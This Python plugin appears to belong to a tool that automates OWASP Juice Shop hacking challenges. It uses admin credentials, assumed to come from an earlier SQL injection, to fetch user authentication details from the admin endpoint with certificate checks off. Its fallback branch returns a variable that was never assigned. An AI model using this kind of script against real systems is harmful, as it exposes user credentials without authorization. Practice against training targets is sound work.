# SOURCE FILE:    admin_section.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Doing Admin section challenge
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Hugh Song
#
# NOTES
#--------------------------------------------------------------------------------------
import time
from plugins import attack as a
from plugins.header_config import *
import http.cookiejar as cookielib

#---------------------------------------------------------------------------------------
#Class: admin_section
#Inherit: Attack
#-----------------------------------------------------------------------------------------------
class admin_section(a.attack_inter):

#-----------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables(REST session; URL).
#-----------------------------------------------------------------------------------------------
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/authentication-details'

#-----------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: Cookie --> for 'admin' user, it will be embedded into POST request cookie field. 
#         header --> for 'admin' user, it will be embedded into POST request header field. 
#Description: This function is used to generate needed data from REST requests
#       
#NOTES:
# ALL REST requests needed data like json_data, header, and cookie must generated through this function
#-----------------------------------------------------------------------------------------------
    def generator(self):
        cookie, header = a.get_auth('admin')
        return cookie, header

#-----------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: response.status_code  --> indicate attack is success or not
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        print("================Start loading admin section==============")
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Admin_Section")
        a.logging.info(logger)
        a.logging.info('Started')
        cookie,header = self.generator()
        if cookie:
            response = self.juice_session.get(self.url, cookies=cookie, headers=header ,verify=False)
            print(response.text)
            if response.status_code == 304 or response.status_code == 200:
                print("successfully get admin dashboard")
                print(response.json()["data"])
            print(response.status_code)
            print("================admin section finished==============")
            a.logging.info('Finished')
            return response.status_code
        else:
            print("Not have authentification yet, please try SQL injection first")
            a.logging.info('Finished')
            print("================admin section finished==============")
            return response.status_code




